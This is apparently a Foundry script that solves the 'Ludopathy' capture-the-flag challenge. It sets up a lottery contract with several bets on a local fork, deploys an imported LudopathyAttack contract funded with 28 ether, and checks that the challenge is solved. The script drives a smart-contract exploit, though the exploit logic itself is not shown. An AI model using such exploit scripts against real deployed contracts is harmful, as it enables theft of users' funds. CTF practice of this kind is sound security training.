// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;

import "forge-std/Script.sol";
import "targets/ludopathy/src/Ludopathy.sol";
import "targets/ludopathy/src/Challenge.sol";
import "src/ludopathy/LudopathyAttack.sol";

contract Attack is Script {
    function run() external {
        address player = vm.envAddress("PLAYER");
        vm.startBroadcast();

        // --- Setup: mimic Deploy.s.sol ---
        // Was: system == player here since we control the local fork
        Ludopathy ludopathy = new Ludopathy(player);

        uint96[] memory nums1 = new uint96[](1);
        nums1[0] = 42;
        uint200[] memory amts1 = new uint200[](1);
        amts1[0] = 5;
        ludopathy.largeBet{value: 5 ether}(nums1, amts1);

        uint96[] memory nums2 = new uint96[](3);
        nums2[0] = 123;
        nums2[1] = 456;
        nums2[2] = 789;
        uint200[] memory amts2 = new uint200[](3);
        amts2[0] = 2;
        amts2[1] = 1;
        amts2[2] = 2;
        ludopathy.largeBet{value: 5 ether}(nums2, amts2);

        uint96[] memory nums3 = new uint96[](3);
        nums3[0] = 100;
        nums3[1] = 121;
        nums3[2] = 144;
        uint200[] memory amts3 = new uint200[](3);
        amts3[0] = 3;
        amts3[1] = 1;
        amts3[2] = 1;
        ludopathy.largeBet{value: 5 ether}(nums3, amts3);

        ludopathy.selectWinningNumber(999);

        Challenge challenge = new Challenge(ludopathy);

        // --- Attack ---
        LudopathyAttack attacker = new LudopathyAttack(ludopathy);
        attacker.attack{value: 28 ether}();

        // --- Verify ---
        bool solved = challenge.isSolved();
        console.log("Ludopathy balance:", address(ludopathy).balance);
        console.log("isSolved:", solved);

        vm.stopBroadcast();
    }
}
